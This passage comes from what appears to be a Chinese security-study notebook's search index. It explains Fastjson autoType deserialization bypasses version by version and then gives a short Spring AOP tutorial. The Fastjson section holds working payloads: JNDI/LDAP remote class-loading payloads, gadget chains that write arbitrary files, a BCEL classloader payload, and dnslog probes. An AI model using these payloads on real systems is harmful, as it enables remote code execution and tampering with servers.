\"autoType is not support. \" + typeName ); }","title":"1.2.43"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#1225-1243-bypass","text":"\u5b9e\u9645\u4e0a\u6211\u4eec\u4f9d\u7136\u80fd\u591f\u4f7f\u7528\u6570\u7ec4\u7684\u65b9\u5f0f(\u4ee5 [ \u5f00\u5934)\u8fdb\u884c\u7ed5\u8fc7\uff0c\u6240\u4ee5\u6211\u4eec\u4e0a\u9762\u7684\u7ed5\u8fc7payload\u4f9d\u7136\u53ef\u884c: { \"@type\" : \"[com.sun.rowset.JdbcRowSetImpl\" [{ \"dataSourceName\" : \"ldap://127.0.0.1:1389/Basic/Command/calc.exe\" , \"autoCommit\" : true }]}","title":"1.2.25-1.2.43 bypass"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#1244","text":"\u8fd9\u4e2a\u7248\u672c\u7684fastjson\u5224\u65ad\u53ea\u8981\u4ee5 [ \u5f00\u5934\u5c31\u629b\u51fa\u5f02\u5e38\uff0c\u4ee5 ; \u7ed3\u5c3e\u4e5f\u629b\u51fa\u5f02\u5e38\uff0c\u56e0\u6b64\u6211\u4eec\u4e0a\u8ff0\u7684\u7ed5\u8fc7\u65b9\u6cd5\u90fd\u5931\u6548\u4e86: long h1 = ( - 3750763034362895579L ^ ( long ) className . charAt ( 0 )) * 1099511628211L ; if ( h1 == - 5808493101479473382L ) { throw new JSONException ( \"autoType is not support. \" + typeName ); } else if (( h1 ^ ( long ) className . charAt ( className . length () - 1 )) * 1099511628211L == 655701488918567152L ) { throw new JSONException ( \"autoType is not support. \" + typeName ); }","title":"1.2.44"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#1225-1244-bypass","text":"\u8fd9\u4e2abypass\u4e3b\u8981\u662f\u7528\u5230\u7684\u4e00\u4e2a\u9ed1\u540d\u5355\u5916\u7684\u7c7b\uff0c\u5176\u662fmybatis\u5305\u91cc\u7684\u7c7b\uff0c\u6240\u4ee5\u9700\u8981\u6709mybatis\u7684\u4f9d\u8d56: { \"@type\" : \"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\" , \"properties\" : { \"data_source\" : \"ldap://127.0.0.1:23457/Command8\" } }","title":"1.2.25-1.2.44 bypass"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#1244-1247","text":"\u589e\u52a0\u4e86\u9ed1\u540d\u5355\uff0c\u540c\u65f6\u622a\u6b62\u52301.2.47\u7248\u672c\uff0cfastjson\u5b58\u5728\u4e00\u4e2a\u5371\u5bb3\u6bd4\u8f83\u5927\u7684\u53cd\u5e8f\u5217\u5316\u7ed5\u8fc7\u65b9\u5f0f\uff0c\u5373\u4e0a\u9762\u63d0\u5230\u7684\u7f13\u5b58\u673a\u5236\u3002","title":"1.2.44-1.2.47"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#1247-bypass","text":"\u6211\u4eec\u4e0a\u9762\u63d0\u5230\u5047\u5982fastjson\u4ece\u7f13\u5b58\u7684mapping\u4e2d\u627e\u5230\u7c7b\u540e\u4f1a\u76f4\u63a5\u8fd4\u56de\uff0c\u90a3\u4e48\u6709\u6ca1\u6709\u4e00\u79cd\u65b9\u5f0f\u53ef\u4ee5\u4f7f\u5f97\u4e00\u4e2a\u7c7b\u7f13\u5b58\u5462\uff1f\u6211\u4eec\u5148\u770b\u770b\u6700\u7ec8\u7684payload: { \"payload1\" : { \"@type\" : \"java.lang.Class\" , \"val\" : \"com.sun.rowset.JdbcRowSetImpl\" }, \"payload2\" : { \"@type\" : \"com.sun.rowset.JdbcRowSetImpl\" , \"dataSourceName\" : \"ldap://localhost:1389/Object\" , \"autoCommit\" : true } } \u53ef\u4ee5\u770b\u5230\u8fd9\u4e2apayload\u4e2d\u4f7f\u7528\u5230\u4e862\u6b21@type\uff0c\u5e76\u4e14\u5728\u7b2c\u4e00\u4e2a@type\u4e2d\u6307\u5b9a\u4e86\u7c7b\u578b\u4e3a java.lang.Class \u8fd9\u4e2a\u770b\u8d77\u6765\u6bd4\u8f83\u7279\u6b8a\u7684\u7c7b\uff0c\u5e76\u4e14\u5b58\u5728val\u5b57\u6bb5\u4e3a com.sun.rowset.JdbcRowSetImpl \uff0c\u7b2c\u4e8c\u6bb5\u4e2d\u5219\u662f\u6211\u4eec\u7684\u539f\u59cbpayload\u3002 \u6211\u4eec\u901a\u8fc7\u8c03\u8bd5\u6765\u7406\u89e3\u8fd9\u4e2apayload\uff0c\u5f53fastjson\u5728\u5904\u7406\u7b2c\u4e00\u4e2a@type\u65f6\uff0c\u4f1a\u5728 this.deserializers.findClass(typeName) \u627e\u5230Class\u8fd9\u4e2a\u7c7b\uff0c\u7136\u540e\u8fd9\u4e2a\u7c7b\u4f1a\u88ab\u8fd4\u56de\uff0c\u5728\u4e0a\u5c42\u7ecf\u8fc7\u4e00\u4e9b\u8d4b\u503c\uff0c\u6700\u7ec8\u4f1a\u4f7f\u7528MiscCodec\u8fd9\u4e2adeserializer\u6765\u5bf9\u8fd9\u4e2a\u7c7b\u8fdb\u884c\u89e3\u6790: \u8ddf\u8fdb\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u8fd9\u91cc\u4e5f\u53ef\u4ee5\u770b\u5230\u5b83\u4f1a\u4eceval\u4e2d\u62ff\u5230\u503c\uff0c\u5e76\u8d4b\u503c\u7ed9objVal: \u540e\u9762\u53c8\u5c06objVal\u7684\u503c\u8d4b\u7ed9strVal: \u5224\u65adclazz\u7684\u7c7b\u578b\uff0c\u8fd9\u91cc\u662fClass.class\uff0c\u6700\u540e\u4f1a\u6839\u636estrVal\u91cc\u7684\u503c\u52a0\u8f7d\u7c7b: \u540c\u65f6\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4f7f\u7528 TypeUtils.loadClass() \u65f6\u9ed8\u8ba4\u662f\u5c06\u7c7b\u7f13\u5b58\u7684\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u5c06\u6211\u4eec\u7684\u6076\u610f\u7c7b\u653e\u5165\u4e86\u7f13\u5b58\u3002 \u5230\u7b2c\u4e8c\u4e2a@type\u65f6\uff0c\u7531\u4e8e\u7f13\u5b58\u5df2\u7ecf\u5b58\u5728\u8fd9\u4e2a\u6076\u610f\u7c7b\uff0c\u6240\u4ee5\u4f1a\u76f4\u63a5\u8fd4\u56de\uff0c\u800c\u4e0d\u4f1a\u8d70\u9ed1\u540d\u5355\uff0c\u6240\u4ee5\u6211\u4eec\u7684payload\u5c31\u80fd\u591f\u7ed5\u8fc7\u4e4b\u524d\u7684\u5b89\u5168\u673a\u5236\u3002 \u8fd9\u91cc\u6709\u4e00\u4e9b\u6ce8\u610f\u4e8b\u9879\uff0c\u7531\u4e8e\u4e0d\u540c\u7248\u672c\u7684 ParserConfig.checkAutoType() \u89e3\u6790\u5b58\u5728\u5dee\u5f02\uff0c\u56e0\u6b64: - 1.2.25-1.2.32\uff1a\u672a\u5f00\u542fAutoTypeSupport\u65f6\u80fd\u6210\u529f\u5229\u7528\uff0c\u5f00\u542fAutoTypeSupport\u53cd\u800c\u4e0d\u80fd\u6210\u529f\u89e6\u53d1 - 1.2.33-1.2.47\uff1a\u65e0\u8bba\u662f\u5426\u5f00\u542fAutoTypeSupport\uff0c\u90fd\u80fd\u6210\u529f\u5229\u7528 \u8fd9\u91cc\u5b58\u5728\u7684\u5dee\u5f02\u4e3b\u8981\u662f\u7531\u4e8e\u57281.2.33-1.2.47\u4e2d\u9ed1\u540d\u5355\u4f1a\u5224\u65ad\u7c7b\u662f\u5426\u5df2\u7ecf\u5728\u7f13\u5b58\u4e2d\uff0c\u5982\u679c\u5df2\u7ecf\u5728\u7f13\u5b58\u91cc\u5219\u4e0d\u4f1a\u8fdb\u884c\u62e6\u622a: \u800c\u5728\u65e7\u7248\u672c\u4e2d\u5219\u4e0d\u5b58\u5728\u8fd9\u4e2a\u5224\u65ad\uff0c\u56e0\u6b64\u57281.2.25-1.2.32\u65f6\uff0c\u5982\u679c\u5f00\u542f\u4e86autotypesupport\uff0c\u5219\u4f1a\u76f4\u63a5\u88ab\u9ed1\u540d\u5355\u62e6\u622a\u3002","title":"&lt;=1.2.47 bypass"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#1248-1267","text":"\u8fd9\u7248\u672c\u7684fastjson\u4e3b\u8981\u662f\u7ee7\u7eed\u6dfb\u52a0\u9ed1\u540d\u5355\uff0c\u540c\u65f6 TypeUtils.loadClass() \u65b9\u6cd5\u9ed8\u8ba4\u4e0d\u542f\u7528\u7f13\u5b58:","title":"1.2.48-1.2.67"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#1267-expectclass-bypass","text":"\u4e0a\u9762\u7684\u7ed5\u8fc7\u65b9\u5f0f\u90fd\u884c\u4e0d\u901a\u4e86\uff0c\u6211\u4eec\u8fd8\u6709\u4ec0\u4e48\u65b9\u6cd5\u53ef\u4ee5\u52a0\u8f7d\u6076\u610f\u7c7b\u5417\uff1f\u5b9e\u9645\u4e0a\u5728 TypeUtils.checkAutoType() \u8fd8\u5b58\u5728\u7740\u4e00\u4e2a\u52a0\u8f7d\u7c7b\u7684\u8bed\u53e5: \u8fd9\u91cc\u7684\u6761\u4ef6 autotypesupport || jsonType || expectClassFlag \uff0c\u8fd9\u91ccautotypesupport\u4e0d\u7ba1\u5f00\u5173\u90fd\u5f71\u54cd\u4e0d\u5927\uff0c\u56e0\u4e3a\u6211\u4eec\u6ca1\u529e\u6cd5\u7ed5\u8fc7\u524d\u9762\u7684\u9ed1\u540d\u5355\u68c0\u6d4b\uff0c\u6211\u4eec\u91cd\u70b9\u5173\u6ce8 expectClassFlag \u8fd9\u4e2a\u9009\u9879\uff0c\u5176\u5728\u8fd9\u91cc\u88ab\u8d4b\u503c: \u8fd9\u91cc\u9700\u8981\u6ee1\u8db3\u4ee5\u4e0b\u51e0\u4e2a\u6761\u4ef6 expectClassFlag \u624d\u4e3atrue: 1. expectClass\u5b58\u5728 2. expectClass\u4e0d\u5728\u9ed1\u540d\u5355\u91cc \u6211\u4eec\u53ef\u4ee5\u770b\u5230expectClass\u662f\u8c03\u7528\u8be5\u51fd\u6570\u65f6\u4f20\u5165\u7684\uff0c\u5728\u6574\u4e2afastjson\u4e2d\u5bfb\u627echeckAutoType\u7684\u8c03\u7528\u4e14expectClass\u4e0d\u4e3a\u7a7a\u7684\uff0c\u5728 JavaBeanDeserializer.deserialize() \u65b9\u6cd5\u4e2d\u627e\u5230\u6211\u4eec\u7684\u76ee\u6807: \u8fd9\u91cc\u7684\u5206\u6790\u7531\u4e8e\u6709\u70b9\u590d\u6742\uff0c\u53c2\u8003\u4e86\u5176\u4ed6\u5e08\u5085\u7684\u6587\u7ae0\uff0c\u60f3\u8981\u8fdb\u5165\u5230\u8fd9\u4e2a\u4f4d\u7f6e\uff0c\u9700\u8981\u4e24\u4e2a@type\uff0c\u7b2c\u4e8c\u4e2a\u9700\u8981\u5b9e\u73b0 AutoCloseable \u63a5\u53e3\uff0c\u4e5f\u5c31\u662f\u6700\u7ec8payload\u7c7b\u4f3c\u4e8e: 1. ` { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"com.example.json.evil.Evil\" , \"cmd\" : \"calc\" } ` \u8fd9\u6837\u6211\u4eec\u5c31\u80fd\u591f\u53cd\u5e8f\u5217\u5316\u5b9e\u73b0\u4e86AutoCloseable\u7684\u7c7b\uff0c\u5229\u7528\u8fd9\u4e2a\u7ed5\u8fc7\u53bb\u5b9e\u73b0\u653b\u51fb\u9700\u8981\u5bfb\u627e\u5230\u5408\u9002\u7684\u5b9e\u73b0\u4e86AutoCloseable\u7684\u7c7b\u5e76\u5c06\u4ed6\u4eec\u7ec4\u5408\u8d77\u6765\uff0c\u4e00\u4e9b\u53ef\u7528\u7684payload\u5982\u4e0b: \u7b2c\u4e00\u4e2a: { \"stream\" : { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.eclipse.core.internal.localstore.SafeFileOutputStream\" , \"targetPath\" : \"./hacked.txt\" , \\\\\u521b\u5efa\u4e00\u4e2a\u7a7a\u6587\u4ef6 \"tempPath\" : \"./test.txt\" \\\\\u521b\u5efa\u4e00\u4e2a\u6709\u5185\u5bb9\u7684\u6587\u4ef6 }, \"writer\" : { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"com.esotericsoftware.kryo.io.Output\" , \"buffer\" : \"cHdu\" , \\\\base 64 \u540e\u7684\u6587\u4ef6\u5185\u5bb9 \"outputStream\" : { \"$ref\" : \"$.stream\" }, \"position\" : 5 }, \"close\" : { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"com.sleepycat.bind.serial.SerialOutput\" , \"out\" : { \"$ref\" : \"$.writer\" } } } \u4e0a\u8ff0payload\u9700\u8981\u76ee\u6807\u73af\u5883\u5b58\u5728\u4ee5\u4e0b\u7684\u4f9d\u8d56: <dependency> <groupId> com.sleepycat </groupId> <artifactId> je </artifactId> <version> 5.0.73 </version> </dependency> <dependency> <groupId> com.esotericsoftware </groupId> <artifactId> kryo </artifactId> <version> 4.0.0 </version> </dependency> <dependency> <groupId> org.aspectj </groupId> <artifactId> aspectjtools </artifactId> <version> 1.9.5 </version> </dependency> \u7b2c\u4e8c\u4e2a: { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"sun.rmi.server.MarshalOutputStream\" , \"out\" : { \"@type\" : \"java.util.zip.InflaterOutputStream\" , \"out\" : { \"@type\" : \"java.io.FileOutputStream\" , \"file\" : \"/tmp/asdasd\" , \"append\" : true }, \"infl\" : { \"input\" : { \"array\" : \"eJxLLE5JTCkGAAh5AnE=\" , \"limit\" : 14 } }, \"bufLen\" : \"100\" }, \"protocolVersion\" : 1 } \u4e0a\u8ff0\u7684payload\u9700\u8981java\u4fdd\u7559\u4e86LocalVariableTable\uff0c\u53c2\u8003\u5176\u4ed6\u5e08\u5085\u7684\u539f\u8bdd: \u800c\u6211\u5728\u591a\u4e2a\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e0b\u7684 OpenJDK\u3001Oracle JDK \u8fdb\u884c\u6d4b\u8bd5\uff0c\u76ee\u524d\u53ea\u53d1\u73b0 CentOS \u4e0b\u7684 OpenJDK 8 \u5b57\u8282\u7801\u8c03\u8bd5\u4fe1\u606f\u4e2d\u542b\u6709 LocalVariableTable\uff08\u6839\u636e\u6c88\u6c89\u821f\u7684\u6587\u7ae0\uff0cRedHat \u4e0b\u7684 JDK8 \u5b89\u88c5\u5305\u4e5f\u4f1a\u6709\uff0c\u4e0d\u8fc7\u4ed6\u5e76\u672a\u8bf4\u660e\u662f OpenJDK \u8fd8\u662f Oracle JDK\uff0c\u6211\u672a\u505a\u6d4b\u8bd5\uff09\u3002 \u7b2c\u4e09\u4e2a(\u9700\u8981commons-io 2.x\u7248\u672c): commons-io 2.0 - 2.6 \u7248\u672c: { \"x\" :{ \"@type\" : \"com.alibaba.fastjson.JSONObject\" , \"input\" :{ \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.apache.commons.io.input.ReaderInputStream\" , \"reader\" :{ \"@type\" : \"org.apache.commons.io.input.CharSequenceReader\" , \"charSequence\" :{ \"@type\" : \"java.lang.String\"\"aaaaaa...(\u957f\u5ea6\u8981\u5927\u4e8e8192\uff0c\u5b9e\u9645\u5199\u5165\u524d8192\u4e2a\u5b57\u7b26)\" }, \"charsetName\" : \"UTF-8\" , \"bufferSize\" : 1024 }, \"branch\" :{ \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.apache.commons.io.output.WriterOutputStream\" , \"writer\" :{ \"@type\" : \"org.apache.commons.io.output.FileWriterWithEncoding\" , \"file\" : \"/tmp/pwned\" , \"encoding\" : \"UTF-8\" , \"append\" : false }, \"charsetName\" : \"UTF-8\" , \"bufferSize\" : 1024 , \"writeImmediately\" : true }, \"trigger\" :{ \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.apache.commons.io.input.XmlStreamReader\" , \"is\" :{ \"@type\" : \"org.apache.commons.io.input.TeeInputStream\" , \"input\" :{ \"$ref\" : \"$.input\" }, \"branch\" :{ \"$ref\" : \"$.branch\" }, \"closeBranch\" : true }, \"httpContentType\" : \"text/xml\" , \"lenient\" : false , \"defaultEncoding\" : \"UTF-8\" }, \"trigger2\" :{ \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.apache.commons.io.input.XmlStreamReader\" , \"is\" :{ \"@type\" : \"org.apache.commons.io.input.TeeInputStream\" , \"input\" :{ \"$ref\" : \"$.input\" }, \"branch\" :{ \"$ref\" : \"$.branch\" }, \"closeBranch\" : true }, \"httpContentType\" : \"text/xml\" , \"lenient\" : false , \"defaultEncoding\" : \"UTF-8\" }, \"trigger3\" :{ \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.apache.commons.io.input.XmlStreamReader\" , \"is\" :{ \"@type\" : \"org.apache.commons.io.input.TeeInputStream\" , \"input\" :{ \"$ref\" : \"$.input\" }, \"branch\" :{ \"$ref\" : \"$.branch\" }, \"closeBranch\" : true }, \"httpContentType\" : \"text/xml\" , \"lenient\" : false , \"defaultEncoding\" : \"UTF-8\" } } } commons-io 2.7 - 2.8.0 \u7248\u672c: { \"x\" :{ \"@type\" : \"com.alibaba.fastjson.JSONObject\" , \"input\" :{ \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.apache.commons.io.input.ReaderInputStream\" , \"reader\" :{ \"@type\" : \"org.apache.commons.io.input.CharSequenceReader\" , \"charSequence\" :{ \"@type\" : \"java.lang.String\"\"aaaaaa...(\u957f\u5ea6\u8981\u5927\u4e8e8192\uff0c\u5b9e\u9645\u5199\u5165\u524d8192\u4e2a\u5b57\u7b26)\" , \"start\" : 0 , \"end\" : 2147483647 }, \"charsetName\" : \"UTF-8\" , \"bufferSize\" : 1024 }, \"branch\" :{ \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.apache.commons.io.output.WriterOutputStream\" , \"writer\" :{ \"@type\" : \"org.apache.commons.io.output.FileWriterWithEncoding\" , \"file\" : \"/tmp/pwned\" , \"charsetName\" : \"UTF-8\" , \"append\" : false }, \"charsetName\" : \"UTF-8\" , \"bufferSize\" : 1024 , \"writeImmediately\" : true }, \"trigger\" :{ \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.apache.commons.io.input.XmlStreamReader\" , \"inputStream\" :{ \"@type\" : \"org.apache.commons.io.input.TeeInputStream\" , \"input\" :{ \"$ref\" : \"$.input\" }, \"branch\" :{ \"$ref\" : \"$.branch\" }, \"closeBranch\" : true }, \"httpContentType\" : \"text/xml\" , \"lenient\" : false , \"defaultEncoding\" : \"UTF-8\" }, \"trigger2\" :{ \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.apache.commons.io.input.XmlStreamReader\" , \"inputStream\" :{ \"@type\" : \"org.apache.commons.io.input.TeeInputStream\" , \"input\" :{ \"$ref\" : \"$.input\" }, \"branch\" :{ \"$ref\" : \"$.branch\" }, \"closeBranch\" : true }, \"httpContentType\" : \"text/xml\" , \"lenient\" : false , \"defaultEncoding\" : \"UTF-8\" }, \"trigger3\" :{ \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.apache.commons.io.input.XmlStreamReader\" , \"inputStream\" :{ \"@type\" : \"org.apache.commons.io.input.TeeInputStream\" , \"input\" :{ \"$ref\" : \"$.input\" }, \"branch\" :{ \"$ref\" : \"$.branch\" }, \"closeBranch\" : true }, \"httpContentType\" : \"text/xml\" , \"lenient\" : false , \"defaultEncoding\" : \"UTF-8\" } } \u7b2c\u56db\u4e2a(\u9700\u8981tomcat-dbcp\u4f9d\u8d56\uff0c\u662ftomcat\u7684\u6570\u636e\u5e93\u9a71\u52a8\u4f9d\u8d56): { { \"@type\" : \"com.alibaba.fastjson.JSONObject\" , \"x\" :{ \"@type\" : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\" , \"driverClassLoader\" : { \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driverClassName\" : \"$$BCEL$$$l$8b$I$A$...\" } }: \"x\" } \u8be6\u60c5\u5206\u6790\u53c2\u8003 \u8fd9\u91cc \u66f4\u591a\u7684\u5229\u7528\u94fe\u5728 Blackhat 2021 \u8bae\u9898\u8be6\u7ec6\u5206\u6790\u2014\u2014 FastJson \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u53ca\u5728\u533a\u5757\u94fe\u5e94\u7528\u4e2d\u7684\u6e17\u900f\u5229\u7528","title":"&lt;=1.2.67 expectclass bypass"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#1268","text":"\u6dfb\u52a0\u4e86safeMode\u8fd9\u4e2a\u5b89\u5168\u5f00\u5173\uff0c\u5f00\u542f\u540e\u4e0d\u518d\u6709autotype\uff0c@type\u952e\u65e0\u6548\uff0c\u4f46\u662f\u8fd9\u4e2a\u5f00\u5173\u9ed8\u8ba4\u662f\u5173\u95ed\u7684\uff0c\u4f9d\u7136\u53ef\u4ee5\u4f7f\u7528\u4e0a\u8ff0\u7684expectclass bypass\u3002","title":"1.2.68"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#\u68c0\u6d4bfastjson","text":"","title":"\u68c0\u6d4bfastjson"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#dnslog","text":"{ \"@type\" : \"java.net.InetAddress\" , \"val\" : \"dnslog\" } \u5728 49 \u4ee5\u4e0b\u624d\u80fd\u89e6\u53d1 { \"@type\" : \"java.net.Inet4Address\" , \"val\" : \"dnslog\" } { \"@type\" : \"java.net.Inet6Address\" , \"val\" : \"dnslog\" } { \"@type\" : \"java.net.InetSocketAddress\" { \"address\" :, \"val\" : \"dnslog\" }} { \"@type\" : \"com.alibaba.fastjson.JSONObject\" , { \"@type\" : \"java.net.URL\" , \"val\" : \"http://dnslog\" }} \"\" } {{ \"@type\" : \"java.net.URL\" , \"val\" : \"http://dnslog\" }: \"aaa\" } Se t [{ \"@type\" : \"java.net.URL\" , \"val\" : \"http://dnslog\" }] Se t [{ \"@type\" : \"java.net.URL\" , \"val\" : \"http://dnslog\" }","title":"dnslog"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#\u68c0\u6d4b\u7248\u672c","text":"\u53c2\u8003\u4e86 \u8fd9\u7bc7\u6587\u7ae0 \uff0c\u9700\u8981\u5728\u54cd\u5e94\u4e2d\u8f93\u51fa\u5f02\u5e38\u624d\u80fd\u7528\u3002 1.\u5f53\u4ee3\u7801\u4f7f\u7528 JSON.parseObject(json , clazz) \u6307\u5b9a\u671f\u671b\u7c7b\u7684\u65b9\u5f0f\u53bb\u89e3\u6790 JSON\uff0c\u4e14 clazz \u4e0d\u80fd\u4e3a fastjson \u5df2\u8bbe\u5b9a\u7684\u5927\u90e8\u5206\u7c7b\u578b\uff0c\u5982\u201cHashmap\u201d\u3001\u201cArrayList\u201d\u3002 2.\u5f53\u4f7f\u7528 JSON.parse(json) \u4e0d\u6307\u5b9a\u671f\u671b\u7c7b\u7684\u65f6\u5019\u53ef\u4ee5\u901a\u8fc7 AutoCloseable \u6765\u89e6\u53d1 \u6240\u4ee5\u53ef\u7528\u7684payload\u4e3a: \u7b2c\u4e00\u79cd: a \u7b2c\u4e8c\u79cd: { \"@type\" : \"java.lang.AutoCloseable\"","title":"\u68c0\u6d4b\u7248\u672c"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#\u5176\u4ed6\u6ce8\u610f\u4e8b\u9879","text":"","title":"\u5176\u4ed6\u6ce8\u610f\u4e8b\u9879"},{"location":"%E5%AE%89%E5%85%A8/java/spring/AOP/","tags":["java","spring"],"text":"AOP # AOP\u662fAspect Oriented Programming\uff0c\u5373\u9762\u5411\u5207\u9762\u7f16\u7a0b\u3002AOP\u662f\u4e00\u79cd\u65b0\u7684\u7f16\u7a0b\u65b9\u5f0f\uff0c\u5b83\u548cOOP\u4e0d\u540c\uff0cOOP\u628a\u7cfb\u7edf\u770b\u4f5c\u591a\u4e2a\u5bf9\u8c61\u7684\u4ea4\u4e92\uff0cAOP\u628a\u7cfb\u7edf\u5206\u89e3\u4e3a\u4e0d\u540c\u7684\u5173\u6ce8\u70b9\uff0c\u6216\u8005\u79f0\u4e4b\u4e3a\u5207\u9762\uff08Aspect\uff09\u3002 SpringAOP # \u5728SpringAOP\u4e2d\uff0c\u901a\u8fc7Advice\u5b9a\u4e49\u6a2a\u5207\u903b\u8f91\uff0cSpring\u652f\u63015\u79cd\u7c7b\u578b\u7684Advice: \u5bfc\u5165\u4f9d\u8d56 # \u8981\u5728Spring\u4e2d\u4f7f\u7528AOP\u7ec7\u5165\uff0c\u9700\u8981\u5bfc\u5165\u4ee5\u4e0b\u4f9d\u8d56 <dependency> <groupId> org.aspectj </groupId> <artifactId> aspectjweaver </artifactId> <version> 1.9.8.M1 </version> </dependency> \u5b9e\u73b0\u65b9\u5f0f\u4e00:\u539f\u751fSpirng API\u63a5\u53e3 # package top.longlone.service ; public interface UserService { public void add (); public void delete (); public void update (); public void query (); } package top.longlone.service ; import org.springframework.stereotype.Service ; public class UserServiceImpl implements UserService { @Override public void add () { System . out . println ( \"\u589e\u52a0\u4e00\u4e2a\u7528\u6237\" ); } @Override public void delete () { System . out . println ( \"\u5220\u9664\u4e00\u4e2a\u7528\u6237\" ); } @Override public void update () { System . out . println ( \"\u66f4\u65b0\u4e00\u4e2a\u7528\u6237\" ); } @Override public void query () { System . out . println ( \"\u67e5\u8be2\u4e00\u4e2a\u7528\u6237\" ); } } package top.longlone.log ; import org.springframework.aop.AfterReturningAdvice ; import org.springframework.aop.MethodBeforeAdvice ; import java.lang.reflect.Method ; public class Log implements MethodBeforeAdvice , AfterReturningAdvice { @Override public void before ( Method method , Object [] args , Object target ) throws Throwable { System . out . println ( target . getClass (). getName () + \"\u7684\" + method . getName () + \"\u6267\u884c\u4e4b\u524d\" ); } @Override public void afterReturning ( Object returnValue , Method method , Object [] args , Object target ) throws Throwable { System . out . println ( target . getClass (). getName () + \"\u7684\" + method . getName () + \"\u6267\u884c\u5b8c\u6bd5\" ); } } <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xmlns:aop= \"http://www.springframework.org/schema/aop\" xsi:schemaLocation= \" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd\" > <bean id= \"userService\" class= \"top.longlone.service.UserServiceImpl\" /> <bean id= \"log\" class= \"top.longlone.log.Log\" /> <!-- \u65b9\u5f0f\u4e00:\u4f7f\u7528\u539f\u751fSpring API\u63a5\u53e3--> <!-- \u5bfc\u5165aop\uff0c\u9700\u8981\u5bfc\u5165aop\u7684\u7ea6\u675f --> <aop:config> <!-- \u589e\u52a0\u5207\u5165\u70b9\uff0cexpression:execution(\u4fee\u9970\u7b26 \u8fd4\u56de\u503c \u7c7b\u540d \u65b9\u6cd5\u540d \u53c2\u6570) --> <aop:pointcut id= \"pointcut\" expression= \"execution(public * top.longlone.service.UserServiceImpl.*(..))\" /> <aop:advisor advice-ref= \"log\" pointcut-ref= \"pointcut\" /> </aop:config> </beans> \u5b9e\u73b0\u65b9\u5f0f\u4e8c:\u81ea\u5b9a\u4e49\u7c7b # \u8fd9\u79cd\u65b9\u5f0f\u6709\u4e00\u4e2a\u7f3a\u70b9\u662f\u65e0\u6cd5\u62ff\u5230\u5207\u5165\u70b9\u548cTarget\u7684\u4fe1\u606f\uff0c\u4f18\u70b9\u662f\u66f4\u597d\u7406\u89e3\u3002 package top.longlone.log ; public class CustomLog { public void before () { System . out . println ( \"====\u6267\u884c\u524d====\" ); } public void after () { System . out . println ( \"====\u6267\u884c\u540e====\" ); } } <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xmlns:aop= \"http://www.springframework.org/schema/aop\" xsi:schemaLocation= \" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd\" > <bean id= \"userService\" class= \"top.longlone.service.UserServiceImpl\" /> <bean id= \"log\" class= \"top.longlone.log.Log\" /> <bean id= \"customLog\" class= \"top.longlone.log.CustomLog\" /> 